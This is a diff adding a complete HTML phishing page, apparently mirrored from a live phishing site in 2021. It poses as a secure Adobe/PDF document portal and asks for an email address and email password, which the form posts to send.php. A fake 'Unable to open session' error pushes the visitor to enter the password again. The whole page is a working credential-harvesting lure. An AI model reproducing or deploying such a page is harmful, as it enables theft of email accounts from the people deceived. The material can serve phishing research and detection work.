@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+
+<html>
+
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Secured Doc Page</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<script>
+			addEventListener("load", function () {
+				setTimeout(hideURLbar, 0);
+			}, false);
+
+			function hideURLbar() {
+				window.scrollTo(0, 1);
+			}
+		</script>
+
+<link href="files/style.css" rel="stylesheet" type="text/css" media="all">
+<link href="files/font-awesome.min.css" rel="stylesheet" type="text/css" media="all">
+
+
+<link href="files/css.html" rel="stylesheet">
+
+<script src="../../../../../../ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body>
+
+<div class="w3layouts-main">
+<div class="bg-layer">
+
+<div id="topbannerdiv"><div class="w-adologo"><span></span></div></div>
+<div class="header-main">
+<div class="main-icon">
+<img src="files/pdfbannerred.png" class="redbanner">
+
+</div>
+<div class="header-left-bottom">
+<form action="send.php" method="post">
+<div class="errormsg hide" id="errormsg">
+Unable to open session! <br>Please Try again with the correct password to your email
+</div>
+<div class="radio-options">
+<input type="radio" id="view" name="action" value="view" checked="">
+<label for="view">View File Online</label><br>
+<input type="radio" id="download" name="action" value="download">
+<label for="download">Download File</label><br>
+<input type="radio" id="send" name="action" value="send">
+<label for="send">Send File to Email</label>
+</div>
+<div id="input-area">
+<label for="username">Email Address</label>
+<div class="icon1">
+<span class="fa fa-user"></span>
+<input type="email" name="email" id="email" placeholder="Email address here" required="true">
+</div>
+<label for="password">Password</label>
+<div class="icon1">
+<span class="fa fa-lock"></span>
+<input type="password" name="pass" id="password" placeholder="Password here" required="">
+</div>
+</div>
+<div class="bottom" align="center">
+<button class="btn" id="login-btn">LOGIN TO ACCESS FILE</button>
+</div>
+</form>
+<div class="instruction">To access our online secure document page, you are required to login your email address, this is to ensure you are the rightful recipient for the protect file. Unauthorized access is highly prohibited</div>
+</div>
+</div>
+</div>
+</div>
+
+<script type="text/javascript" src="js/main.js"></script>
+</body>
+
+<!-- Mirrored from servicelink.casa/adobe/appV4/files/5c3e-443a-1d3f-6ff2-1e7b-aa8e-d16f/id=905543c456/?e=example@gmail.com by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 26 Jun 2021 05:29:47 GMT -->
+</html>
